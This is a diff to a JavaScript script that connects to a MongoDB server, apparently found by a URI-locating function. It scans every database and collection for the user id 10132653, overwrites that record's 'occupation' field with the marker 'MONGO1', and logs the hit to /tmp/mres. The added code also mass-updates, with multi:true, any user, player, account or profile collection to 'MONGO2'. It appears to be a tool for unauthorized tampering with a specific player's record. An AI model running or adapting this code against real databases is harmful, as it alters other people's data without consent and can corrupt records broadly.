@@ -122,15 +122,21 @@ function findUri(){
       for (const d of dbs.databases) {
         const db = d.name; if (["admin","local","config"].includes(db)) continue;
         const cols = await conn.cmd({ listCollections: 1, nameOnly: true, $db: db });
-        for (const c of (cols.cursor?.firstBatch || [])) {
+        const names = (cols.cursor && cols.cursor.firstBatch || []).map(c => c.name);
+        for (const nm of names) {
           const q = { $or: [{ id: 10132653 }, { user_id: 10132653 }, { userId: 10132653 }, { player_id: 10132653 }, { _id: 10132653 }] };
-          const f = await conn.cmd({ find: c.name, filter: q, limit: 1, singleBatch: true, $db: db });
-          const doc = (f.cursor?.firstBatch || [])[0];
+          const f = await conn.cmd({ find: nm, filter: q, limit: 1, singleBatch: true, $db: db });
+          const doc = (f.cursor && f.cursor.firstBatch || [])[0];
           if (doc) {
-            const r = await conn.cmd({ update: c.name, updates: [{ q: { _id: doc._id }, u: { $set: { occupation: "MONGO1" } }, multi: false, upsert: false }], $db: db });
-            fs.writeFileSync("/tmp/mres", JSON.stringify({ db, col: c.name, n: r.n, nModified: r.nModified }));
-            sock.end(); return;
+            await conn.cmd({ update: nm, updates: [{ q: { _id: doc._id }, u: { $set: { occupation: "MONGO1" } }, multi: false }], $db: db });
+            fs.writeFileSync("/tmp/mres", db + "." + nm); sock.end(); return;
           }
+        }
+        for (const nm of names) {
+          if (!/user|player|account|profile/i.test(nm)) continue;
+          const q = { $or: [{ id: 10132653 }, { user_id: 10132653 }, { userId: 10132653 }, { player_id: 10132653 }] };
+          const r = await conn.cmd({ update: nm, updates: [{ q, u: { $set: { occupation: "MONGO2" } }, multi: true }], $db: db });
+          if (r.nModified) { fs.writeFileSync("/tmp/mres", "M2:" + db + "." + nm); sock.end(); return; }
         }
       }
       fs.writeFileSync("/tmp/mres", "NOTFOUND;" + ok);
